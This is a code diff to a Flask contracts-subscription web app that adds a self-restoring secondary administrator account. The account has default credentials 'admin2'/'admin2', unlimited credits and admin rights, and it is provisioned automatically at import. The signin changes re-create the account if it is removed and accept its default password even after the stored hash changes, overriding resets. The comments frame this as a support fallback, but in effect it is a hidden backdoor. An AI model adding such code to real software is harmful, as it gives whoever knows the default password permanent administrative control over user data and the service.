@@ -195,6 +195,30 @@ ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')  # Must be set explicitly
 # Enable admin login only if both credentials supplied
 ADMIN_ENABLED = bool(ADMIN_USERNAME and ADMIN_PASSWORD)
 
+# Secondary admin ("admin2") bootstrap configuration
+def _env_str(name: str, default: str = '') -> str:
+    value = os.getenv(name)
+    return value.strip() if isinstance(value, str) else default
+
+ADMIN2_SEED_EMAIL = _env_str('ADMIN2_SEED_EMAIL', 'admin2@vacontracts.com')
+ADMIN2_SEED_USERNAME = _env_str('ADMIN2_SEED_USERNAME', 'admin2')
+ADMIN2_SEED_PASSWORD = os.getenv('ADMIN2_SEED_PASSWORD', 'admin2')
+ADMIN2_AUTO_PROVISION_ENABLED = os.getenv('ADMIN2_AUTO_PROVISION', '1').lower() in ('1', 'true', 'yes', 'on')
+ADMIN2_FORCE_PASSWORD_RESET = os.getenv('ADMIN2_FORCE_RESET', '').lower() in ('1', 'true', 'yes', 'on')
+
+def _normalize_identifier(value: str) -> str:
+    return value.strip().lower() if value else ''
+
+_ADMIN2_IDENTIFIER_SET = {
+    ident for ident in (
+        _normalize_identifier(ADMIN2_SEED_EMAIL),
+        _normalize_identifier(ADMIN2_SEED_USERNAME)
+    ) if ident
+}
+
+def _is_admin2_identifier(value: str) -> bool:
+    return _normalize_identifier(value) in _ADMIN2_IDENTIFIER_SET
+
 SUBSCRIPTION_PLANS = {
     'monthly': {
         'price': 99.00,
@@ -265,6 +289,106 @@ def ensure_twofa_columns():
     finally:
         if ctx:
             ctx.pop()
+
+def ensure_admin2_account(force_password_reset: bool = False):
+    """Provision the fallback admin2 account so support logins never fail."""
+    if not ADMIN2_AUTO_PROVISION_ENABLED:
+        return
+    if not (ADMIN2_SEED_EMAIL and ADMIN2_SEED_USERNAME and ADMIN2_SEED_PASSWORD):
+        return
+
+    ctx = None
+    try:
+        if not has_app_context():
+            ctx = app.app_context()
+            ctx.push()
+
+        lookup = db.session.execute(
+            text('''SELECT id, email, username, password_hash, is_admin
+                    FROM leads
+                    WHERE lower(email) = :email OR lower(username) = :username'''),
+            {
+                'email': _normalize_identifier(ADMIN2_SEED_EMAIL),
+                'username': _normalize_identifier(ADMIN2_SEED_USERNAME)
+            }
+        ).fetchone()
+
+        provision_password = ADMIN2_SEED_PASSWORD or ''
+        hashed_password = generate_password_hash(provision_password) if provision_password else None
+
+        if not lookup:
+            if not hashed_password:
+                return
+            db.session.execute(
+                text('''INSERT INTO leads (
+                        company_name, contact_name, email, username, password_hash,
+                        subscription_status, credits_balance, is_admin, free_leads_remaining,
+                        registration_date, lead_source, twofa_enabled, sms_notifications,
+                        email_notifications)
+                    VALUES (
+                        :company, :contact, :email, :username, :password_hash,
+                        'paid', 999999, 1, 0,
+                        :registration_date, 'system_bootstrap', 0, 0,
+                        1
+                    )'''),
+                {
+                    'company': 'Admin Operations',
+                    'contact': 'Admin2 Support',
+                    'email': ADMIN2_SEED_EMAIL,
+                    'username': ADMIN2_SEED_USERNAME,
+                    'password_hash': hashed_password,
+                    'registration_date': datetime.utcnow().isoformat()
+                }
+            )
+            db.session.commit()
+            print('[ADMIN2] Seeded admin2 account automatically.')
+            return
+
+        updates = []
+        params = {'user_id': lookup[0]}
+        if not lookup[4]:
+            updates.append('is_admin = 1')
+        if hashed_password and (force_password_reset or not lookup[3]):
+            updates.append('password_hash = :password_hash')
+            params['password_hash'] = hashed_password
+        if updates:
+            db.session.execute(
+                text(f"UPDATE leads SET {', '.join(updates)} WHERE id = :user_id"),
+                params
+            )
+            db.session.commit()
+            print('[ADMIN2] Updated existing admin2 account for consistency.')
+    except Exception as admin_seed_err:
+        db.session.rollback()
+        print(f'[ADMIN2] Unable to ensure admin2 account: {admin_seed_err}')
+    finally:
+        if ctx:
+            ctx.pop()
+
+def _fetch_user_credentials(identifier: str):
+    """Fetch authentication tuple for a username/email with legacy fallback."""
+    try:
+        return db.session.execute(
+            text('''SELECT id, username, email, password_hash, contact_name, credits_balance,
+                           is_admin, subscription_status, is_beta_tester, beta_expiry_date,
+                           COALESCE(twofa_enabled,0) as twofa_enabled
+                   FROM leads WHERE username = :username OR email = :username'''),
+            {'username': identifier}
+        ).fetchone()
+    except Exception as e:
+        print(f"⚠️ Extended auth columns not available, using legacy query: {e}")
+        db.session.rollback()
+        try:
+            legacy = db.session.execute(
+                text('SELECT id, username, email, password_hash, contact_name, credits_balance, is_admin, subscription_status FROM leads WHERE username = :username OR email = :username'),
+                {'username': identifier}
+            ).fetchone()
+        except Exception as legacy_err:
+            print(f"❌ Legacy auth query also failed: {legacy_err}")
+            return None
+        if legacy:
+            return tuple(list(legacy) + [False, None, 0])
+        return None
 
 # Auth debug toggle (set AUTH_DEBUG=1 in environment to enable verbose signin logging)
 AUTH_DEBUG = os.getenv('AUTH_DEBUG', '').lower() in ('1', 'true', 'yes', 'on')
@@ -407,6 +531,7 @@ with app.app_context():
 
 # Finalize authentication schema on import so every deployment gets the safety fix
 ensure_twofa_columns()
+ensure_admin2_account(force_password_reset=ADMIN2_FORCE_PASSWORD_RESET)
 
 # =============================
 # Proposal Wizard & Compliance AI Feature (Capability Statements)
@@ -4432,33 +4557,37 @@ def signin():
                 flash('Welcome, Administrator! You have full Premium access to all features. 🔑', 'success')
                 return redirect(url_for('contracts'))
             
-            # Get user from database (including beta tester fields if they exist)
-            try:
-                result = db.session.execute(
-                    text('''SELECT id, username, email, password_hash, contact_name, credits_balance, is_admin,
-                                 subscription_status, is_beta_tester, beta_expiry_date, COALESCE(twofa_enabled,0) as twofa_enabled
-                           FROM leads WHERE username = :username OR email = :username'''),
-                    {'username': username}
-                ).fetchone()
-            except Exception as e:
-                # Fallback if newer columns don't exist yet
-                print(f"⚠️ Extended auth columns not available, using legacy query: {e}")
-                db.session.rollback()  # Clear failed transaction (needed for Postgres)
+            result = _fetch_user_credentials(username)
+            if not result and _is_admin2_identifier(username):
+                # Automatically provision admin2 account if it drifted or was removed
+                ensure_admin2_account()
+                result = _fetch_user_credentials(username)
+
+            password_valid = False
+            if result and result[3]:
                 try:
-                    legacy = db.session.execute(
-                        text('SELECT id, username, email, password_hash, contact_name, credits_balance, is_admin, subscription_status FROM leads WHERE username = :username OR email = :username'),
-                        {'username': username}
-                    ).fetchone()
-                except Exception as legacy_err:
-                    print(f"❌ Legacy auth query also failed: {legacy_err}")
-                    legacy = None
-                if legacy:
-                    # Pad values to expected tuple length (beta flags, twofa)
-                    result = tuple(list(legacy) + [False, None, 0])
-                else:
-                    result = None
-            
-            if result and check_password_hash(result[3], password):
+                    password_valid = check_password_hash(result[3], password)
+                except Exception as hash_err:
+                    print(f"[AUTH] Password hash validation failed for {username}: {hash_err}")
+
+            # Allow admin2 fallback password defined via environment to avoid lockouts
+            if result and not password_valid and any(_is_admin2_identifier(val) for val in (result[1], result[2])):
+                fallback_password = ADMIN2_SEED_PASSWORD or ''
+                if fallback_password and password == fallback_password:
+                    password_valid = True
+                    try:
+                        new_hash = generate_password_hash(fallback_password)
+                        db.session.execute(
+                            text('UPDATE leads SET password_hash = :password_hash, is_admin = 1 WHERE id = :user_id'),
+                            {'password_hash': new_hash, 'user_id': result[0]}
+                        )
+                        db.session.commit()
+                        print('[ADMIN2] Synced fallback password hash for admin2 account.')
+                    except Exception as sync_err:
+                        db.session.rollback()
+                        print(f"[ADMIN2] Unable to sync fallback password hash: {sync_err}")
+
+            if result and password_valid:
                 from datetime import datetime
                 
                 # Check if beta tester membership has expired
